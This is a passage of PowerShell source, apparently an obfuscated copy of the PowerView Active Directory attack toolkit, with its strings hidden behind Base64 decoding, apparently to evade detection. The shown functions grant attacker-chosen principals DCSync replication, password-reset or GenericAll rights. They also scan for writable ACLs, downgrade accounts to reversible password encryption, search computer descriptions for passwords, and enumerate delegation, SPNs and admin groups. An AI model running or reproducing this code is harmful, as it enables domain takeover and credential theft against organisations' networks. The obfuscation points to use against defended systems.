                    $ControlType = [System.Security.AccessControl.AccessControlType] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))
                    $ACEs = @()

                    if($RightsGUID) {
                        $GUIDs = @($RightsGUID)
                    }
                    else {
                        $GUIDs = Switch ($Rights) {
                            
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
                            
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
                            
                            
                            
                            
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RENTeW5j"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBj")))}
                        }
                    }

                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType
                    }

                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JhbnRpbmcgcHJpbmNpcGFsICRQcmluY2lwYWxTSUQgJyRSaWdodHMnIG9uIHswfQ=="))) -f $($_.Properties.distinguishedname))

                    try {
                        
                        ForEach ($ACE in $ACEs) {
                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JhbnRpbmcgcHJpbmNpcGFsICRQcmluY2lwYWxTSUQgJ3swfScgcmlnaHRzIG9uIHsxfQ=="))) -f $($ACE.ObjectType), $($_.Properties.distinguishedname))
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgZ3JhbnRpbmcgcHJpbmNpcGFsICRQcmluY2lwYWxTSUQgJyRSaWdodHMnIG9uICRUYXJnZXRETiA6IHswfQ=="))) -f $_)
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I6IHswfQ=="))) -f $_)
            }
        }
    }
}


function Invoke-ACLScanner {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [Alias('DN')]
        [String]
        $DistinguishedName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveGUIDs,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    
    Get-ObjectACL @PSBoundParameters | ForEach-Object {
        
        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {
        
        try {
            [int]($_.IdentitySid.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ=="))))[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {
        
        ($_.ActiveDirectoryRights -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))) -or ($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU=")))) -or ($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRl")))) -or ($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRl")))) -or (($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))) -and ($_.AccessControlType -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))))
    }
}


function Get-GUIDMap {


    [CmdletBinding()]
    Param (
        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))}

    $SchemaPath = (Get-NetForest).schema.name

    $SchemaSearcher = Get-DomainSearcher -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize
    if($SchemaSearcher) {
        $SchemaSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNjaGVtYUlER1VJRD0qKQ==")))
        try {
            $SchemaSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6IHswfQ=="))) -f $_)
        }      
    }

    $RightsSearcher = Get-DomainSearcher -ADSpath $SchemaPath.replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2NoZW1h"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWQtUmlnaHRz")))) -DomainController $DomainController -PageSize $PageSize
    if ($RightsSearcher) {
        $RightsSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCk=")))
        try {
            $RightsSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6IHswfQ=="))) -f $_)
        }
    }

    $GUIDs
}


function Get-NetComputer {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $SPN,

        [String]
        $OperatingSystem,

        [String]
        $ServicePack,

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        
        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {

        if ($CompSearcher) {

            
            if($Unconstrained) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBmb3IgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9u")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj01MjQyODgp")))
            }
            
            if($Printers) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoaW5nIGZvciBwcmludGVycw==")))
                
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PXByaW50UXVldWUp")))
            }
            if($SPN) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBTUE46ICRTUE4=")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZpY2VQcmluY2lwYWxOYW1lPSRTUE4p")))
            }
            if($OperatingSystem) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9wZXJhdGluZ3N5c3RlbT0kT3BlcmF0aW5nU3lzdGVtKQ==")))
            }
            if($ServicePack) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrPSRTZXJ2aWNlUGFjayk=")))
            }

            $CompSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc0FNQWNjb3VudFR5cGU9ODA1MzA2MzY5KShkbnNob3N0bmFtZT0kQ29tcHV0ZXJOYW1lKSRGaWx0ZXIp")))

            try {

                $CompSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {
                        
                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($Up) {
                        
                        if ($FullData) {
                            
                            Convert-LDAPProperty -Properties $_.Properties
                        }
                        else {
                            
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I6IHswfQ=="))) -f $_)
            }
        }
    }
}


function Get-ADObject {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $ReturnRaw,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($SID) {
            
            try {
                $Name = Convert-SidToName $SID
                if($Name) {
                    $Canonical = Convert-NT4toCanonical -ObjectName $Name
                    if($Canonical) {
                        $Domain = $Canonical.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[0]
                    }
                    else {
                        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcmVzb2x2aW5nIFNJRCAnJFNJRA==")))
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcmVzb2x2aW5nIFNJRCAnJFNJRCcgOiB7MH0="))) -f $_)
                return $Null
            }
        }

        $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($ObjectSearcher) {

            if($SID) {
                $ObjectSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0c2lkPSRTSUQpJEZpbHRlcik=")))
            }
            elseif($Name) {
                $ObjectSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYobmFtZT0kTmFtZSkkRmlsdGVyKQ==")))
            }
            elseif($SamAccountName) {
                $ObjectSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudE5hbWU9JFNhbUFjY291bnROYW1lKSRGaWx0ZXIp")))
            }

            $ObjectSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                if($ReturnRaw) {
                    $_
                }
                else {
                    
                    Convert-LDAPProperty -Properties $_.Properties
                }
            }
        }
    }
}


function Set-ADObject {


    [CmdletBinding()]
    Param (
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,

        $PropertyValue,

        [Int]
        $PropertyXorValue,

        [Switch]
        $ClearValue,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Arguments = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
    }
    
    $RawObject = Get-ADObject -ReturnRaw @Arguments
    
    try {
        
        $Entry = $RawObject.GetDirectoryEntry()
        
        if($ClearValue) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xlYXJpbmcgdmFsdWU=")))
            $Entry.$PropertyName.clear()
            $Entry.commitchanges()
        }

        elseif($PropertyXorValue) {
            $TypeName = $Entry.$PropertyName[0].GetType().name

            
            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue 
            $Entry.$PropertyName = $PropertyValue -as $TypeName       
            $Entry.commitchanges()     
        }

        else {
            $Entry.put($PropertyName, $PropertyValue)
            $Entry.setinfo()
        }
    }
    catch {
        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3Igc2V0dGluZyBwcm9wZXJ0eSAkUHJvcGVydHlOYW1lIHRvIHZhbHVlICckUHJvcGVydHlWYWx1ZScgZm9yIG9iamVjdCB7MH0gOiB7MX0="))) -f $($RawObject.Properties.samaccountname), $_)
    }
}


function Invoke-DowngradeAccount {


    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Switch]
        $Repair
    )

    process {
        $Arguments = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
        }

        
        $UACValues = Get-ADObject @Arguments | select useraccountcontrol | ConvertFrom-UACValue

        if($Repair) {

            if($UACValues.Keys -contains ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQ=")))) {
                
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            
            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue -1
        }

        else {

            if($UACValues.Keys -contains ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9FWFBJUkVfUEFTU1dPUkQ=")))) {
                
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536
            }

            if($UACValues.Keys -notcontains ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQ=")))) {
                
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            
            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue 0
        }
    }
}


function Get-ComputerProperty {


    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($Properties) {
        
        $Properties = ,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZQ=="))) + $Properties | Sort-Object -Unique
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))
    }
}


function Find-ComputerField {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cGFzcw=="))),

        [Alias('Field')]
        [String]
        $SearchField = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGVzY3JpcHRpb24="))),

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function Get-NetOU {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($OUSearcher) {
            if ($GUID) {
                
                $OUSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9b3JnYW5pemF0aW9uYWxVbml0KShuYW1lPSRPVU5hbWUpKGdwbGluaz0qJEdVSUQqKSk=")))
            }
            else {
                $OUSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9b3JnYW5pemF0aW9uYWxVbml0KShuYW1lPSRPVU5hbWUpKQ==")))
            }

            $OUSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                if ($FullData) {
                    
                    Convert-LDAPProperty -Properties $_.Properties
                }
                else { 
                    
                    $_.properties.adspath
                }
            }
        }
    }
}


function Get-NetSite {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Sites,CN=Configuration" -PageSize $PageSize
    }
    process {
        if($SiteSearcher) {

            if ($GUID) {
                
                $SiteSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c2l0ZSkobmFtZT0kU2l0ZU5hbWUpKGdwbGluaz0qJEdVSUQqKSk=")))
            }
            else {
                $SiteSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c2l0ZSkobmFtZT0kU2l0ZU5hbWUpKQ==")))
            }
            
            try {
                $SiteSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        
                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-NetSubnet {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $SubnetSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix "CN=Subnets,CN=Sites,CN=Configuration" -PageSize $PageSize
    }

    process {
        if($SubnetSearcher) {

            $SubnetSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c3VibmV0KSk=")))

            try {
                $SubnetSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        
                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049JFNpdGVOYW1l"))) }
                    }
                    else {
                        
                        if ( ($SiteName -and ($_.properties.siteobject -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049JFNpdGVOYW1lLA=="))))) -or ($SiteName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))) {

                            $SubnetProperties = @{
                                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VibmV0"))) = $_.properties.name[0]
                            }
                            try {
                                $SubnetProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZQ==")))] = ($_.properties.siteobject[0]).split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0]
                            }
                            catch {
                                $SubnetProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZQ==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I=")))
                            }

                            New-Object -TypeName PSObject -Property $SubnetProperties                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-DomainSID {


    param(
        [String]
        $Domain
    )

    $FoundDomain = Get-NetDomain -Domain $Domain
    
    if($FoundDomain) {
        
        $PrimaryDC = $FoundDomain.PdcRoleOwner
        $PrimaryDCSID = (Get-NetComputer -Domain $Domain -ComputerName $PrimaryDC -FullData).objectsid
        $Parts = $PrimaryDCSID.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ=="))))
        $Parts[0..($Parts.length -2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
    }
}


function Get-NetGroup {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,
        
        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData,

        [Switch]
        $RawSids,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if($GroupSearcher) {

            if($AdminCount) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tpbmcgZm9yIGFkbWluQ291bnQ9MQ==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGFkbWluY291bnQ9MSk=")))
            }

            if ($UserName) {
                
                $User = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize

                
                $UserDirectoryEntry = $User.GetDirectoryEntry()

                
                $UserDirectoryEntry.RefreshCache(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dG9rZW5Hcm91cHM="))))

                $UserDirectoryEntry.TokenGroups | Foreach-Object {
                    
                    $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    
                    
                    if(!($GroupSid -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS01LTMyLTU0NXwtNTEzJA=="))))) {
                        if($FullData) {
                            Get-ADObject -SID $GroupSid -PageSize $PageSize
                        }
                        else {
                            if($RawSids) {
                                $GroupSid
                            }
                            else {
                                Convert-SidToName $GroupSid
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG9iamVjdFNJRD0kU0lEKSRGaWx0ZXIp")))
                }
                else {
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG5hbWU9JEdyb3VwTmFtZSkkRmlsdGVyKQ==")))
                }
            
                $GroupSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    
                    if ($FullData) {
                        
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}


function Get-NetGroupMember {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain = (Get-NetDomain).Name,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [Switch]
        $Recurse,

        [Switch]
        $UseMatchingRule,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if(!$DomainController) {
            $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
        }
    }

    process {

        if ($GroupSearcher) {

            if ($Recurse -and $UseMatchingRule) {
                
                if ($GroupName) {
                    $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                else {
                    
                    $SID = (Get-DomainSID -Domain $Domain) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LTUxMg==")))
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.name

                if ($GroupDN) {
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShtZW1iZXJvZjoxLjIuODQwLjExMzU1Ni4xLjQuMTk0MTo9JEdyb3VwRE4pJEZpbHRlcik=")))
                    $GroupSearcher.PropertiesToLoad.AddRange((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZE5hbWU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29u"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29udGltZXN0YW1w"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHNjb3JlcHJvcGFnYXRpb25kYXRh"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2hlbmNyZWF0ZWQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmFkcGFzc3dvcmR0aW1l"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWNjb3VudGV4cGlyZXM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aXNjcml0aWNhbHN5c3RlbW9iamVjdA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNuY2hhbmdlZA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0Y2F0ZWdvcnk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGVzY3JpcHRpb24="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29kZXBhZ2U="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aW5zdGFuY2V0eXBl"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y291bnRyeWNvZGU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y24="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWRtaW5jb3VudA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9nb25ob3Vycw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0Y2xhc3M="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9nb25jb3VudA=="))),([Sys